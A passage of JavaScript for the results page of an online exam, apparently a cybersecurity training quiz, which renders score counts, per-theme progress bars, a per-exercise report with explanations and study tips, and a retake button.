      '<p class="certline">Read the report below, focus on the "what to study" lines, then retake the exam. Questions and answers will be reshuffled.</p>';
  }
  sc.appendChild(panel);
  var sg=el('div','statgrid');
  var mk=function(n,l){var s=el('div','stat');s.innerHTML='<div class="n">'+n+'</div><div class="l">'+esc(l)+'</div>';return s;};
  sg.appendChild(mk(R.correct,'\u2714 Correct'));
  sg.appendChild(mk(R.wrong,'\u2718 Incorrect'));
  sg.appendChild(mk(R.skipped.length,'\u26A0 Skipped, left unanswered (excluded)'));
  sg.appendChild(mk(R.untouched,'Not reached (excluded)'));
  sc.appendChild(sg);
  /* per-theme bars */
  var th={};
  D.exercises.forEach(function(ex){
    var r=S.work[ex.id];
    if(!th[ex.theme])th[ex.theme]={got:0,base:0};
    if(r&&(r.status==='correct'||r.status==='partial'||r.status==='wrong')){th[ex.theme].got+=r.awarded;th[ex.theme].base+=10;}
  });
  var tw=el('div','card');
  tw.appendChild(el('h3','','Per-theme progress'));
  Object.keys(th).forEach(function(k){
    var t=th[k];
    var pct=t.base?Math.round(t.got/t.base*100):0;
    var b=el('div','themebar');
    b.innerHTML='<div class="tl"><span>'+esc(k)+'</span><span>'+pct+'%</span></div><div class="tb"><i style="width:'+pct+'%;background:'+(pct>=70?'var(--good)':(pct>0?'var(--warn)':'var(--bad)'))+'"></i></div>';
    tw.appendChild(b);
  });
  sc.appendChild(tw);
  /* detailed report */
  var rep=el('div','card');
  rep.appendChild(el('h3','','Detailed report'));
  rep.appendChild(el('p','dim','Every exercise, in exam order. Skipped-and-unanswered exercises are shown as excluded.'));
  S.order.forEach(function(oi,n){
    var ex=D.exercises[oi];
    var r=S.work[ex.id]||{status:null};
    var it=el('div','repitem');
    var chip='',lbl='';
    if(r.status==='correct'){chip='ok';lbl='\u2714 Correct';}
    else if(r.status==='partial'){chip='part';lbl='\u25B0 Partial';}
    else if(r.status==='wrong'){chip='bad';lbl='\u2718 Incorrect';}
    else {chip='skip';lbl='Not answered — excluded from score';}
    var h=el('div','rep-h');
    h.innerHTML='<span class="stchip '+chip+'">'+lbl+'</span><h5>'+esc(ex.id+' — '+(ex.title||ex.question.slice(0,60)))+'</h5><span class="dim">'+esc(ex.theme)+'</span><span class="dim">'+(r.status&&r.status!=='skipped'&&r.status!==null?(r.awarded+'/10 pts'):'0 pts')+'</span>';
    it.appendChild(h);
    var b=el('div','rep-b');
    if(r.status==='correct'||r.status==='partial'||r.status==='wrong'){
      b.innerHTML='<div><b>Your answer:</b> '+(r.answerSummary||'—')+'</div>'+
        '<div style="margin-top:6px"><b>Correct answer:</b> '+(S.widgets[ex.id]?S.widgets[ex.id].summary():'')+'</div>'+
        '<div style="margin-top:6px"><b>Why:</b> '+ptext(ex.explain)+'</div>'+
        (r.status!=='correct'?'<div style="margin-top:6px"><b>What to study:</b> '+esc(ex.study)+'</div>':'')+
        (ex.perspNote?'<div style="margin-top:6px"><b>Two-sided view:</b> '+ptext(ex.perspNote)+'</div>':'');
    } else {
      b.innerHTML='<div class="dim">You skipped this exercise and never answered it. The answer is hidden so the exam stays reusable for a retake. The underlying concept is covered in the explanation of its twin exercises in this tier and the other tiers.</div>';
    }
    it.appendChild(b);
    rep.appendChild(it);
  });
  sc.appendChild(rep);
  var btns=el('div','btnrow');btns.style.justifyContent='center';btns.style.margin='16px 0';
  var rt=el('button','mainbtn','\u21BB Retake exam');
  rt.addEventListener('click',function(){S.retook=true;S.retakeArmed=true;renderIntro();});
  btns.appendChild(rt);
  sc.appendChild(btns);
  st.appendChild(sc);
  renderHeader();
  window.scrollTo(0,0);
  /* score count-up, then report once */
  if(reducedMotion()){
    big.textContent=R.pct+'%';
    if(!S.reported){S.reported=true;reportScore(R.score,R.total);}
  } else {
    var cur=0,steps=Math.max(1,R.pct),inc=Math.max(1,Math.ceil(R.pct/40));
    var iv=setInterval(function(){
      cur=Math.min(R.pct,cur+inc);
      big.textContent=cur+'%';
      if(cur>=R.pct){
        clearInterval(iv);
        if(!S.reported){S.reported=true;reportScore(R.score,R.total);}
      }
    },28);
  }
}

/* ---------- site handshake (optional) ---------- */
window.addEventListener('message',function(event){
  if(!event.data)return;
  if(event.data.type!=='CYBERPULSE_INIT'&&event.data.type!=='CYBERMASTERY_INIT')return;
  try{
    if(event.data.username)S.learner=String(event.data.username).slice(0,60);
  }catch(e){}
  if(S.phase==='intro')renderIntro();
});

/* ---------- boot ---------- */
renderIntro();

</script>
